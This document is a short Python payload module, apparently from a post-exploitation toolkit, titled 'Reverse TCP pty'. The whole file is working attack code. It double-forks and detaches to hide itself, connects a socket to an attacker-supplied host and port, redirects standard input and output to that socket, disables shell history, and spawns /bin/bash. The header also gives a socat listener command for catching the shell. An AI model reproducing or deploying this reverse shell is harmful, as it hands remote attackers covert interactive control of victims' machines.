'''
NAME: Reverse TCP pty
DESCRIPTION: Opens pseudo-tty for terminal-like connections. Taken from python-pty-shells. Example listener: <tt>socat file:`tty`,echo=0,raw tcp4-listen:LPORT</tt>
VAR LHOST: host ip
VAR LPORT: host port
'''
import os, sys

lhost = LHOST
lport = int(LPORT)
try:
    # Use double fork + setsid/umask to mask parent process etc...
    if os.fork() == 0:
        if os.fork():
            # _exit exits without cleanup.
            os._exit(0)

        os.setsid()
        os.umask(0)

        cmd = ("import os, pty, socket" + "\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
        "s.connect(('{}',{}))" + "\n"
        "os.dup2(s.fileno(),0)" + "\n"
        "os.dup2(s.fileno(),1)" + "\n"
        "os.dup2(s.fileno(),2)" + "\n"
        "os.putenv('HISTFILE','/dev/null')" + "\n"
        "pty.spawn('/bin/bash')" + "\n"
        "s.close()" + "\n"
        "os._exit(0)" + "\n").format(lhost,lport)

        # Completely forget all inherited information from parents.
        os.execv(sys.executable, [sys.executable, '-c', cmd])

    sys.stdout.write("Fork successful, going dark.")
except OSError as e:
    sys.stderr.write("{}".format(e))
